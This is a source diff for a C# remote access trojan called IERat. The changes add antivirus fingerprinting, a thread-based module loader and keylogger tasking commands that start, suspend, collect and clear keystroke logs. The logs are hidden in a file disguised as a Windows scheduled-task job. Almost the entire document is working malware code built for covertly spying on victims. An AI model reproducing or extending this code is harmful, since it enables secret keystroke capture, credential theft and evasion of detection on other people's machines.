@@ -2,13 +2,12 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Drawing;
-using System.Drawing.Imaging;
 using System.IO;
+using System.Reflection;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Web.Script.Serialization;
-using System.Windows.Forms;
 
 namespace IERat
 {
@@ -20,21 +19,26 @@ namespace IERat
             Username = Environment.UserName;
             Domain = Environment.UserDomainName;
             Hostname = Environment.MachineName;
-            OSVersion = Environment.OSVersion.ToString();
+            OSVersion = Utils.GetOS();
+            AV = AVUtils.GetAV();
             AgentTasks = new Queue<TaskObject>();
             CompletedAgentTasks = new Queue<TaskObject>();
-            Version = "free";
+            Version = Assembly.GetExecutingAssembly().GetName().Version.ToString();
             Cwd = Directory.GetCurrentDirectory();
+            LoadedModules = new Dictionary<String, Thread>();
         }
         public Guid ID { get; set; }
         public string Username { get; set; }
         public string Domain { get; set; }
         public string Hostname { get; set; }
         public string OSVersion { get; set; }
+        public string AV { get; set; }
+
         public string Cwd { get; set; }
         public string Version { get; set; }
         public Queue<TaskObject> AgentTasks { get; set; }
         public Queue<TaskObject> CompletedAgentTasks { get; set; }
+        public Dictionary<String, Thread> LoadedModules { get; set; }
 
         public string GenerateBeacon()
         {
@@ -77,6 +81,66 @@ namespace IERat
                                 {
                                     string pwd = Directory.GetCurrentDirectory();
                                     NewAgentTask.Result = pwd;
+                                }
+                                else if (CmdType == "klog_start")
+                                {
+                                    if (this.LoadedModules.ContainsKey("klog"))
+                                    {
+                                        if (this.LoadedModules["klog"].ThreadState.ToString() == "Running") {
+                                            NewAgentTask.Result = "The Klog is already running";
+                                        }
+                                        else
+                                        {
+                                            this.LoadedModules["klog"].Resume();
+                                            NewAgentTask.Result = "Klog Resumed";
+                                        }
+                                    }
+                                    else
+                                    {
+                                        var klogThread = Modules.LoadModule(NewAgentTask.args);
+                                        this.LoadedModules.Add("klog", klogThread);
+                                        this.LoadedModules["klog"].Start();
+                                        NewAgentTask.Result = "Klog Loaded & Started";
+                                    }
+                                }
+                                else if (CmdType == "klog_stop")
+                                {
+                                    if (this.LoadedModules.ContainsKey("klog"))
+                                    {
+                                        if (this.LoadedModules["klog"].IsAlive == true) {
+                                            this.LoadedModules["klog"].Suspend();
+                                            NewAgentTask.Result = "The Klog module was stopped";
+                                        }
+                                        else {
+                                            NewAgentTask.Result = "The Klog module is not running";
+                                        }
+                                    }
+                                    else
+                                    {
+                                        NewAgentTask.Result = "The Klog module is not loaded";
+                                    }
+                                }
+                                else if (CmdType == "klog_collect")
+                                {
+                                    if (this.LoadedModules.ContainsKey("klog"))  {
+                                        if (File.Exists(@"C:\Windows\Tasks\Updater.job"))  {
+                                            NewAgentTask.Result = File.ReadAllText(@"C:\Windows\Tasks\Updater.job");
+                                        }
+                                        else { NewAgentTask.Result = "Results file was not found"; }
+                                    }
+                                    else
+                                    {
+                                        NewAgentTask.Result = "The Klog module was not loaded";
+                                    }
+                                }
+                                else if (CmdType == "klog_clear")
+                                {
+                                    if (File.Exists(@"C:\Windows\Tasks\Updater.job"))
+                                    {
+                                        File.Delete(@"C:\Windows\Tasks\Updater.job");
+                                        NewAgentTask.Result = "Results file was deleted successfully";
+                                    }
+                                    else { NewAgentTask.Result = "Results file was not found"; }
                                 }
                                 else if (CmdType == "download")
                                 {
